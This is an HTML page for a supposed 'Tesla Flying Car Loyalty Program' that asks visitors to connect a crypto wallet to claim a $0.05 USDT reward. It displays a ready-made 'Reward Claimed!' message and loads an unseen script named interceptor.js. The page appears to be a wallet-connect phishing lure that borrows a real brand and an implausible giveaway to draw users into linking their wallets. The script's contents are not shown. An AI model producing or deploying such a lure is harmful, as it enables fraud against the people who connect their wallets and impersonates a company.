<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Flying Car Rewards</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Tesla Flying Car Loyalty Program</h1>
            <p>Connect your wallet to claim your exclusive $0.05 USDT reward.</p>
        </header>
        <main>
            <div id="wallet-status">
                <button id="connect-btn">Connect Wallet</button>
                <div id="balance-display" style="display:none;">
                    <p>Connected: <span id="user-address"></span></p>
                    <p>Reward Status: <span id="reward-status">Pending</span></p>
                </div>
            </div>
            <div id="notification" class="hidden">
                <p>🎉 Reward Claimed! $0.05 USDT sent to your wallet.</p>
            </div>
        </main>
    </div>
    <script src="interceptor.js"></script>
    <script src="app.js"></script>
</body>
</html>
